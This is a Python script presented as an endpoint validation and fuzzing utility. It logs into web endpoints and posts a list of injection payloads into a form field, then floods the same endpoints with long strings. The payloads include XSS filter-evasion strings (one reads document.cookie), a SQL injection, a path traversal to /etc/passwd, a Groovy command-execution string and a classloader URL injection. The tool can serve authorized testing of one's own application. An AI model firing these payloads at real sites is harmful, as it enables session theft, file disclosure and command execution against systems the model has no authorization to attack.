import requests
from requests.auth import HTTPBasicAuth
import data  # update your json/rest data for each endpoint in this file
from threading import Thread
import time
import sys

# XSS content pulled from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
badblood = [ "exp/*<A STYLE='no\\xss:noxss(\"*//*\")\;xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>" ,"<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")\';</STYLE>","<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">","<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\">a</img>a","a<IMG onmouseover=\"alert('xxs')\">","a<IMG SRC=# onmouseover=\"alert('xxs')\">","a<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","a<a onmouseover=alert(document.cookie)>xxs link</a>","a<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>","a<IMG SRC=javascript:alert(\"XSS\")>","<IMG SRC=JaVaScRiPt:alert('XSS')>" ,"a<IMG SRC=javascript:alert('XSS')>","a<IMG SRC=\"javascript:alert('XSS');\">","BB'';!--\"<XSS>=&{()}<br><br><H1>POWER OF THE DARKSIDE</H1>","' or 1=1;#",'a@gmail.comclass.classLoader.URLs[0]=jar:http:%5C%5C127.0.0.1:9999/ApacheJMeter.jar','path ../../../../etc/passwd%00jim@gmail.com','nb %00 NullByte %00<script>alert("I see")</script>','%5C','%5C%5C','\x00',"'",'\x00\x00\x00',"<script>alert(\"Oh my\")</script>what??","%3Cscript%3Ealert(%22Oh%20my%22)%3C%2Fscript%3E Skider","x\x00${'ls'.execute()}\x00Travesty"]

# Modify the endpoints you want to iterate over:
endpoint_list = {'https://mywebsite.xxx/some/endpoint/save' : data.endpoint1,
                 'https://mywebsite.xxx/some/otherendpoint/save' : data.endpoint2,
                 }

# If you need to capture session cookies, set up requests for session data:
s = requests.Session()

# Example below is using HTTPBasicAuth, change as needed for your environment:
def login(username,password):
    login = {'username': username, "pass": password}
    return s.post("https://mysite.xxx/login", login)

# setting a default here for some params. data is set to grab the key (json data) for a default endpoint
def bad_data_injection(username,password,bad_data=badblood, endpoint=endpoint_list.keys()[0],data=endpoint_list['https://mywebsite.xxx/some/endpoint/save']):
    login(username,password)
    for evil in bad_data:
        data['description'] = evil
        # print data  # if you want to see what is being sent to each endpoint, print the data
        # print s.cookies  # if you need to see the cookie, this is how you access it
        r2 = s.post(endpoint, data,
                auth=HTTPBasicAuth(username, password))

# Fuzzing acts like a traditional fuzzer... makes an array of large and larger strings then iterates over them, passing them into the endpoint to try and break it with an overflow
def fuzzer(username, password, endpoint, data, buffer_char, size=50):
    login(username,password)
    buffer=[buffer_char]
    counter = 100

    while len(buffer ) <= size:
        buffer.append(buffer_char*counter)
        counter=counter+200
    bad_data_injection(username, password, bad_data=buffer, endpoint=endpoint, data=data)

def endpoint_ender():
    print " "
    print "/-------------------------------------------------------\\"
    print "---             Endpoint Validation Util              ---"
    print "---       Be sure to have 'requests' installed:       ---"
    print "---                pip install requests               ---"
    print "\\-------------------------------------------------------/"
    print "[*] To test endpoints for data validation enter: 1"
    print "[*] To fuzz endpoints with long data strings enter: 2"
    print "[*] Enter any other key to QUIT"
    choice = raw_input('> ')

    if choice == str(1):
        # If you need to grab a login session, use what's below to log in a user to access your endpoints
        username = raw_input('Enter your Username: ')
        password = raw_input('Enter your Password: ')
        threads = list()
        timer = time.time()
        for target in endpoint_list:    # iterates over dictionary, supplying keys as url
            print 'Attacking Target: ' + target + ' with XSS/Exploits'
            # bad_data_injection(username,password,endpoint=target, data=endpoint_list[target]) # non parallel version
            t = Thread(target=bad_data_injection, args=(username,password,badblood,target,endpoint_list[target])) # run all calls in parallel
            t.start()
            print "Waiting for Endpoint Attack to finish..."
            t.join() # the join lets us wait for each thread to finish, remove if you want a different experience.
        timer2 = time.time()
        print timer2 - timer
    elif choice == str(2):
        # If you need to grab a login session, use what's below to log in a user to access your endpoints
        username = raw_input('Enter your Username: ')
        password = raw_input('Enter your Password: ')
        character_fuzz = raw_input('Enter Character to Fuzz with: ')
        # Read the code in the fuzzer method, to see how the buffer limit is used
        bsize = raw_input('Enter buffer limit: ')
        for target in endpoint_list:
            fuzzer(username, password, endpoint=target, data=endpoint_list[target], buffer_char=character_fuzz, size=int(bsize))
    else:
        sys.exit(0)
    return endpoint_ender()
if __name__ == '__main__':
    endpoint_ender()

